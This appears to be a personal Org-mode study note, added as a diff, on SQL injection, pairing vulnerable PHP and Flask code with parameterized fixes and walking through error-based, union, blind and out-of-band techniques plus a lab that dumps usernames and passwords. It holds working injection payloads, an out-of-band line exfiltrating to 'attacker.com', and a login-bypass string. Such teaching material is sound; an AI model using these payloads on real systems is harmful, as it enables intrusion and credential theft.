@@ -1,0 +1,253 @@
+#+title: Sqli
+#+author: gabriel
+
+https://tib3rius.com/sqli
+
+ SQL Injection attacks can lead to the theft of sensitive data, corruption, or complete deletion of database structures.
+
+*some sqli types* ->
+
+[[./imgs/sqli_types.png]]
+
+
+* Logical operators
+In SQL, a single condition may not be sufficient to meet users' needs. In such cases, SQL provides logical operators to use multiple conditions simultaneously.
+
+The most common logical operators are AND, OR, and NOT.
+
+The AND operator takes two conditions and returns true if both conditions are evaluated to be true, otherwise it returns false.
+
+: SELECT 1 = 1 AND 'example' = 'example';
+
+The OR operator takes two conditions and returns true if at least one of the conditions is true.
+
+: SELECT 1 = 1 OR 'leet' = '1337';
+
+The NOT operator negates a boolean value, turning true into false, and false into true.
+
+: SELECT NOT 1 = 1;
+
+The AND, OR, and NOT operators can also be represented by symbols: && for AND, || for OR, and ! for NOT, respectively.
+
+#+begin_src sql
+SELECT 1 = 1 && 'example' = 'abc';
+SELECT 1 =1 || 'example' = 'abc';
+SELECT !1 = 1;
+#+end_src
+
+* special characters
+Special characters in SQL are used to perform certain functions or carry specific meanings in database queries
+
+The table below includes some important special characters commonly used in SQL along with their descriptions and example usages.
+
+| Character | Description | Example Usage
+| * | Used to select all columns | SELECT * FROM users;
+| % | Represents any sequence of characters in 'LIKE' queries | SELECT * FROM users WHERE name LIKE 'A%';
+|_ |Represents a single character in 'LIKE' queries  | SELECT * FROM users WHERE name LIKE 'A_';
+| ' | Used to delimit strings | SELECT * FROM users WHERE name = 'Jack';
+|" | Used to delimit column and table names | SELECT "name" FROM "users";
+
+* Situations Leading to SQL Injection Vulnerability
+SQL Injection vulnerabilities are common security issues in web applications, often resulting from poor programming practices.
+
+One of the most common causes of SQL Injection vulnerabilities is the inclusion of unchecked user inputs in SQL queries.
+
+*vuln code* ->
+#+begin_src php
+$username = $_GET['username'];
+$query = "SELECT * FROM users WHERE username = '$username'";
+$result = mysqli_query($conn, $query);
+#+end_src
+
+*secure code* ->
+#+begin_src php
+$username = $_GET['username'];
+$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->bind_param("s", $username);
+$stmt->execute();
+$result = $stmt->get_result();
+#+end_src
+
+** Insufficient Input Validation
+Unsafe input validation or sanitization processes can also lead to SQL Injection vulnerabilities. Applications should properly validate and sanitize user inputs.
+
+*vuln code* ->
+#+begin_src php
+$username = $_GET['username'];
+$query = "SELECT * FROM users WHERE username = '$username'";
+$result = mysqli_query($conn, $query);
+#+end_src
+
+*secure code* ->
+#+begin_src php
+$username = $_GET['username'];
+if (preg_match('/^[a-zA-Z0-9_]{1,15}$/', $username)) {
+    $stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
+    $stmt->bind_param("s", $username);
+    $stmt->execute();
+    $result = $stmt->get_result();
+} else {
+    echo "Invalid username.";
+}
+#+end_src
+
+** Exposed error messages
+Exposing SQL error messages to users allows attackers to analyze the database structure. Attackers can use this information for more sophisticated attacks.
+
+
+
+* In-band SQL injection
+In-Band SQL Injection occurs when the attacker can both send and receive data over the same communication channel. This type is the most common way to exfiltrate information.
+
+** error-based SQL injection
+This technique relies on causing the application to display error messages from the database, revealing its structure. The attacker intentionally makes errors in the query and takes advantage of the error messages.
+
+: SELECT * FROM users WHERE id = 1' AND extractvalue(rand(),concat(0x3a,(SELECT @@version)));
+
+** union-based SQL injection
+A Union-based attack is carried out using the UNION operator. The attacker aims to extract additional data by appending extra queries to the original query with the UNION keyword.
+
+: SELECT username, password FROM users WHERE id = 1 UNION SELECT credit_card, pin FROM customers;
+
+** out-of-band
+Out-of-Band SQL Injection occurs when the data is retrieved using a different channel or protocol. It often involves exfiltrating data via DNS or HTTP requests.
+
+: SELECT load_file(concat('\\\\', (SELECT @@version), '.attacker.com\\abc'));
+
+* Blind SQL injection
+Blind SQL Injection is used when the attacker cannot directly obtain information about the database structure or data.
+
+** boolean-based
+Data can be inferred based on whether the query returns true or false. The attacker sends conditional queries and infers the database content from the application responses.
+
+This query checks whether the first character of the admin user’s password is 'a'. ->
+: SELECT * FROM users WHERE username = 'admin' AND substring(password,1,1) = 'a';
+
+** time-based
+This method works by creating a time delay based on the query result. If the query is true, there is a delay; if false, there is no delay.
+
+This query causes the database to pause for 10 seconds if the condition is true. The response delay indicates that the condition is true. ->
+: SELECT * FROM users WHERE username = 'admin' AND IF(1=1, sleep(10), false);
+
+* Login bypass python panel
+In this example, we'll explore how to log in using SQL Injection on a login panel developed with Python.
+
+Let's assume we have a login panel in a simple web application where users can log in with a username and password. The backend Python code adds user inputs directly into the SQL query, leading to an SQL Injection vulnerability.
+
+The following Python script is written for a simple login process using a web framework like Flask.
+
+*vuln code* ->
+#+begin_src python
+from flask import Flask, request, render_template_string
+import sqlite3
+
+app = Flask(__name__)
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    error = ''
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+
+        conn = sqlite3.connect('database.db')
+        cursor = conn.cursor()
+
+        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+        cursor.execute(query)
+        result = cursor.fetchone()
+
+        if result:
+            return "Welcome, " + result[1]  # result[1] is the username
+        else:
+            error = 'Invalid credentials'
+    return render_template_string('<form method="post">Username: <input name="username" type="text"><br>Password: <input name="password" type="text"><br><input type="submit" value="Login"></form>{{ error }}', error=error)
+
+if __name__ == '__main__':
+    app.run(debug=True)
+#+end_src
+
+In this code, the username and password are directly added into the SQL query (query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"), creating an SQL Injection vulnerability.
+
+To bypass the login system using SQL Injection, one can enter the following payload in the username field to log in without knowing the password.
+
+: admin' --
+
+The payload transforms the SQL query in the Python code into the following ->
+: SELECT * FROM users WHERE username='admin' --' AND password=''
+
+Here, the -- symbol is used to start a comment in SQL, neutralizing the rest of the query.
+
+** security recommendation
+To prevent such vulnerabilities, applications should validate inputs and use parameterized queries to construct SQL queries. In Python, this can be done using the SQLite3 library as follows:
+
+#+begin_src python
+query = "SELECT * FROM users WHERE username=? AND password=?"
+cursor.execute(query, (username, password))
+#+end_src
+
+
+* Union based SQL Injection
+This technique relies on combining SQL queries using the UNION operator. The UNION operator is used to combine the results of two or more SQL queries into a single result set.
+
+For a successful attack, the original query and the appended query must have the same number of columns and compatible data types in the columns.
+
+*Determining the number of columns* ->
+First, determine the number of columns the original SQL query returns in the targeted application.
+- Knowing the number of columns is essential for crafting a correct UNION SQL Injection payload.
+
+ *Ensuring data type compatibility* ->
+ Ensure that the data types of the columns are compatible because all queries using UNION must have the same structure.
+
+*Extracting information* ->
+The attacker adds additional queries using the UNION command to extract additional data.
+
+* Union-based SQLI
+This lab contains a SQL injection vulnerability in the search function. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
+
+To complete the lab, perform a SQL injection UNION attack that retrieves database name.
+
+What is the password for the user named "oliverlee" in the database?
+
+First, let's test for the presence of an SQL Injection vulnerability by using the payload
+: ' OR 1=1#.
+
+Using this payload, we discover the presence of an SQL Injection vulnerability, now let's write a UNION SQL Injection payload like the one below to determine the number of columns.
+
+: FORD' UNION SELECT 1,2#
+
+As seen in the image above, we didn't get a result. We will continue our attempts with 3 columns, 4 columns, and so on.
+
+with 4 colums works !!
+: FORD' UNION SELECT 1,2,3,4#
+
+Now, we can modify the UNION part of our working payload to extract the desired data from the database.
+
+** Information gathering functs
+| Function	| Description
+| USER()	| Returns the database user name and host name
+| DATABASE()	| Returns the name of the selected database
+| VERSION()	| Returns the version of the SQL server
+
+Let's add these functions to our SQL Injection payload and execute it.
+
+with this payload we get the version database and username
+:  FORD' UNION SELECT USER(),DATABASE(),VERSION(),4 #
+
+this payload too ->
+: ' UNION SELECT USER(),DATABASE(),VERSION(),4 #
+
+response ->
+: root@localhost 	ecliptica_cars 	8.0.35 	4
+
+Get the tables from ecliptica_cars ->
+: ' UNION SELECT 1, group_concat(table_name), 3, 4 FROM information_schema.tables WHERE table_schema = 'ecliptica_cars' #
+
+response ->
+: 1 	cars,settings,users 	3 	4
+
+List columns from the users table ->
+: ' UNION SELECT 1, group_concat(column_name), 3, 4 FROM information_schema.columns WHERE table_schema = 'ecliptica_cars' AND table_name = 'users' #
+
+Extract data from users ->
+: ' UNION SELECT 1, group_concat(username, ':', password), 3, 4 FROM users #
